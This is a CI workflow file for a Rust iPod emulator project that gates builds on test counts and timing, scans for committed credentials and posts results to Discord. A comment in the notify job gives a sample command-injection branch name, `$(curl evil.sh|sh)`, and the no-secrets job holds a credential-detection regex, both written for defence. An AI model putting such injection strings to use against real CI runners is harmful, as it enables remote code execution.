name: ci

# Forgejo Actions — the gates that actually run.
#
# WHY THIS FILE EXISTS, and it is not "a second CI":
#
#   `.github/workflows/ci.yml` has NEVER EXECUTED. `gh api
#   repos/siggifly/ipod-emulator/actions/runs` answered `total_count: 0` on
#   2026-08-30 — after a 206-commit push to master, which should have fired
#   it — and a manual dispatch answers `HTTP 422: Actions has been disabled
#   for this user`. That is account-level and not something this repository
#   can fix; the repo API still cheerfully reports `enabled: true`.
#
#   So every gate this project believed it had was theatre. This file is the
#   same gates pointed at the forge that can run them.
#
# WHAT THIS DOES NOT COVER. The GitHub matrix builds Linux, macOS and
# Windows. This runner is Linux only, so a macOS- or Windows-specific break
# still gets through. That is a known hole, stated rather than papered over:
# when GitHub Actions is unblocked, keep BOTH and let this one be the fast
# gate. Do not delete `.github/workflows/ci.yml` for it.
#
# The toolchain is host-provided — data.forgejo.org carries no dtolnay
# mirror, the same constraint the umbrella's build-check.yml documents.

on:
  push:
    branches: [dev, master]
  pull_request:
    branches: [dev, master]
  workflow_dispatch:

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

jobs:
  build-check:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4

      - name: Toolchain
        run: |
          cargo --version
          rustc --version

      # **Three crates, not four, and the reason is not laziness.** `ipod-gui`
      # depends on eframe with `glow`, `x11` and `wayland`, which need system GL
      # and display headers. The GitHub workflow installs them with `apt-get`;
      # this runner is a host executor with no root, so it cannot. Building the
      # window here fails for a reason that says nothing about the code.
      #
      # What is covered is where the emulator actually lives: the ARMv4T core,
      # the machine and its peripherals and boot path, and the static inspector.
      # What is NOT covered is the window. That hole is real — state it, do not
      # let a green tick here be read as "the GUI builds".
      - name: Build the core crates
        run: cargo build -p arm7tdmi -p eapp-loader -p eapp-inspect --all-targets

      # **The count AND the clock.** This repository has been burned by a
      # suite that reported "275 passed" in 0.26 s without compiling
      # anything. A pass that arrives impossibly fast is not a pass, so the
      # gate reads both numbers and refuses a suspicious one.
      - name: Test, and read the count and the clock
        run: |
          set -o pipefail
          start=$(date +%s)
          cargo test -p arm7tdmi -p eapp-loader -p eapp-inspect 2>&1 | tee /tmp/test.log
          elapsed=$(( $(date +%s) - start ))
          passed=$(grep -oE 'test result: ok\. [0-9]+ passed' /tmp/test.log \
                   | awk '{s+=$4} END {print s+0}')
          echo "passed=$passed elapsed=${elapsed}s"
          # **250, from a measured baseline of 294** — the three crates run
          # 294 tests locally as of 2026-08-30. The floor sits below that with
          # room for a genuinely removed test, and far enough above zero that a
          # suite which silently stops collecting cannot pass. A floor picked by
          # guesswork is a gate that never bites; this one has a number behind it.
          if [ "$passed" -lt 250 ]; then
            echo "::error::only $passed tests ran; the baseline is 294"
            exit 1
          fi
          if [ "$elapsed" -lt 5 ]; then
            echo "::error::suite finished in ${elapsed}s — it did not compile or did not run"
            exit 1
          fi

  no-secrets:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@v4

      # AGENTS.md §2: nothing under `resources/` is ever committed, and no
      # real serial, GUID, name or Apple ID enters a tracked file. This gate
      # is cheap and the failure it prevents is not reversible — once a
      # identifier is pushed to a public repository it stays reachable.
      - name: Nothing from resources/, and no credentials
        run: |
          fail=0
          if git ls-files | grep -q '^resources/'; then
            echo "::error::files under resources/ are tracked; AGENTS.md §2 forbids it"
            fail=1
          fi
          if git grep -nIE 'BEGIN [A-Z ]*PRIVATE KEY|gh[pousr]_[A-Za-z0-9]{20,}|AKIA[0-9A-Z]{16}' \
               -- . ':(exclude).forgejo' >/dev/null 2>&1; then
            echo "::error::a credential-shaped string is tracked"
            fail=1
          fi
          exit $fail

  # ── Telling people ────────────────────────────────────────────────────────
  #
  # **Runs on red as well as green, and that is the whole point.** A bot that
  # only speaks when things pass trains everyone to read silence as success,
  # which is exactly how this project lost nine conclusions to instruments that
  # failed quietly. `if: always()` is load-bearing.
  #
  # The webhook is a repo secret rather than a literal: anyone holding that URL
  # can post into the channel as us. It posts from the RUNNER, not the Forgejo
  # server — the server has no egress to discord.com, which a hook test proved
  # (HTTP 204 accepted, nothing delivered).
  notify:
    runs-on: ubuntu-latest
    needs: [build-check, no-secrets]
    if: always()
    timeout-minutes: 5
    steps:
      - name: Post the result to Discord
        env:
          HOOK: ${{ secrets.DISCORD_WEBHOOK }}
          # **Every one of these is an env var and none is interpolated into the
          # script below.** `${{ github.ref_name }}` expands before the shell sees
          # it, and a branch name is chosen by whoever pushes — a branch called
          # `$(curl evil.sh|sh)` would otherwise run on this runner. Passing them
          # through `env:` and reading them as `"$VAR"` is what makes that inert.
          # This matters more here than on a solo repo: the whole point of this
          # file is that other people push branches to it.
          BUILD: ${{ needs.build-check.result }}
          SECRETS: ${{ needs.no-secrets.result }}
          REF: ${{ github.ref_name }}
          ACTOR: ${{ github.actor }}
          SHA: ${{ github.sha }}
        run: |
          [ -n "$HOOK" ] || { echo "no webhook configured; nothing to post"; exit 0; }
          # The message is assembled in Python from the environment, never by
          # string-pasting into shell. json.dumps also escapes anything odd in a
          # branch name so it cannot break the payload.
          python3 - <<'PY' > /tmp/payload.json
          import json, os
          build, secrets = os.environ["BUILD"], os.environ["SECRETS"]
          ref, actor, sha = os.environ["REF"], os.environ["ACTOR"], os.environ["SHA"]
          if build == "success" and secrets == "success":
              msg = f"\u2705 **gates green** on `{ref}` \u2014 build-check and no-secrets both passed."
          else:
              msg = (f"\U0001F534 **gates failed** on `{ref}` \u2014 build-check: `{build}`, "
                     f"no-secrets: `{secrets}`. Pushed by **{actor}**.")
          print(json.dumps({"content": f"{msg}\n`{sha[:8]}`"}))
          PY
          # `--fail` so a rejected post fails the step instead of passing quietly.
          curl -sS --fail -X POST "$HOOK" -H 'Content-Type: application/json' \
            --data @/tmp/payload.json
